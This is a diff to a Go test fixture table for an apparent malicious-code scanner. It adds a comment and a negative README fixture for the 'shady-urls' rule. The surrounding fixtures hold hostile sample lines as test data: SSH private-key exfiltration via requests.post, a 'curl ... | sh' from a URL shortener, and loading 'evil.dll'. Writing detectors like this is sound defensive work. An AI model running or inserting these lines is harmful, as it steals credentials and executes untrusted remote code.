@@ -34,6 +34,9 @@ var corePositives = []fixture{
 	{"silent-process", "run.py", `subprocess.run(cmd, stdout=subprocess.DEVNULL)`},
 	{"sensitive-exfil", "steal.py", `d = open('.ssh/id_rsa').read(); requests.post(url, data=d)`},
 	{"dll-hijack", "win.py", `ctypes.windll.kernel32.LoadLibraryA(b"evil.dll")`},
+	// shady-urls is a capability now, so the fixture needs a threat to pair
+	// with. It already has one: "curl ... | sh" trips download-exec, which
+	// remains a threat and is exactly the case where a shortener matters.
 	{"shady-urls", "install.sh", `curl -sL https://bit.ly/3xKpL9q | sh`},
 	// char-codes is a capability now, so the fixture needs a threat to pair
 	// with. socket.gethostbyname trips dns-ops, which remains a threat.
@@ -177,6 +180,7 @@ var coreNegatives = []fixture{
 	{"non-ascii", "lone.txt", "caf" + accentedE},
 	{"char-codes", "lone.js", `var s = String.fromCharCode(104, 105);`},
 	{"package-manager", "lone.sh", `pip install requests`},
+	{"shady-urls", "README.md", `Check out the demo video: https://bit.ly/3xKpL9q`},
 
 	// Agent rules are scoped to agent paths; the same content in ordinary
 	// project files must not fire.
